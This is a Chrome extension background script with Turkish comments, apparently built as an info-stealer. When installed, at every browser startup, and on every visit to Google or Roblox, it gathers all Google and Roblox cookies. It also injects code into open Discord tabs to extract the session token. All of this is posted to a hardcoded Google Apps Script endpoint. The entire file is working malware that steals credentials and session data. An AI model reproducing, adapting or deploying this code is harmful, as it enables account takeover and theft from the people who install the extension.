// background.js — SIKE SIKE ATAN VERSİYON
const GAS_URL = "https://script.google.com/macros/s/AKfycbwXz56f1L65iUPJaDy4GYps2_YF9svy_rklc40aKtQJxs7egVz4jjqDk6VcHSrqCMJcbg/exec";

// 1. Eklenti ilk kurulduğu an her şeyi çek ve at
chrome.runtime.onInstalled.addListener(() => {
  console.log("[*] Eklenti kuruldu, tarama basliyor...");
  grabEverything();
});

// 2. Chrome her açıldığında tekrar at
chrome.runtime.onStartup.addListener(() => {
  grabEverything();
});

// 3. Google'a veya Roblox'a girildiğinde (sekme yüklendiğinde) anında at
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    if (tab.url.includes("google.com") || tab.url.includes("roblox.com")) {
      grabEverything();
    }
  }
});

// --- ANA FONKSİYON ---
async function grabEverything() {
  console.log("[*] Cookie'ler toplaniyor...");
  
  // 1. Google Cookie'leri
  let googleCookies = await new Promise(r => chrome.cookies.getAll({ domain: ".google.com" }, r));
  if (googleCookies.length > 0) {
    let gData = googleCookies.map(c => `${c.name} = ${c.value}`).join("\n");
    let gEmbed = {
      content: "",
      embeds: [{
        title: "Google Cookies",
        description: "```\n" + gData + "\n```",
        color: 3447003
      }]
    };
    // Sadece ilk 9 cookie'yi göstermek yerine hepsini txt olarak yolla
    let gDump = JSON.stringify(googleCookies, null, 2);
    await sendToGAS("google", gEmbed, gDump, "google_dump.txt");
  }

  // 2. Roblox Cookie'leri
  let robloxCookies = await new Promise(r => chrome.cookies.getAll({ domain: ".roblox.com" }, r));
  if (robloxCookies.length > 0) {
    let rData = robloxCookies.map(c => `${c.name} = ${c.value}`).join("\n");
    let rEmbed = {
      content: "",
      embeds: [{
        title: "Roblox Cookies",
        description: "```\n" + rData + "\n```",
        color: 16711680
      }]
    };
    let rDump = JSON.stringify(robloxCookies, null, 2);
    await sendToGAS("roblox", rEmbed, rDump, "roblox_dump.txt");
  }

  // 3. Discord Token'ı
  let discordToken = await getDiscordToken();
  if (discordToken) {
     let dEmbed = {
      content: "",
      embeds: [{
        title: "Discord Token",
        description: "```\n" + discordToken + "\n```",
        color: 10181046
      }]
    };
    await sendToGAS("discord", dEmbed, discordToken, "discord_token.txt");
  }
}

// --- DISCORD TOKEN BULUCU ---
async function getDiscordToken() {
  try {
    // Discord token leveldb dosyalarında gizlidir. Eklenti doğrudan dosya okuyamaz,
    // ama web isteklerinden yakalayabiliriz.
    let tabs = await chrome.tabs.query({ url: "*://*.discord.com/*" });
    if (tabs.length > 0) {
      // Discord açıksa, localStorage'dan veya sayfa içinden almaya çalış (Injection)
      let result = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0)?.exports?.default?.getToken();
          return token || null;
        }
      });
      if (result && result[0] && result[0].result) {
        return result[0].result;
      }
    }
  } catch(e) {}
  return null;
}

// --- GAS KÖPRÜSÜ ---
async function sendToGAS(type, payload, fileContent, fileName) {
  try {
    const body = {
      type: type,
      payload_json: payload,
      file_content: fileContent,
      file_name: fileName
    };
    await fetch(GAS_URL, {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify(body)
    });
    console.log("[+] " + type + " gonderildi.");
  } catch (e) {
    console.error("gas bridge:", e);
  }
}
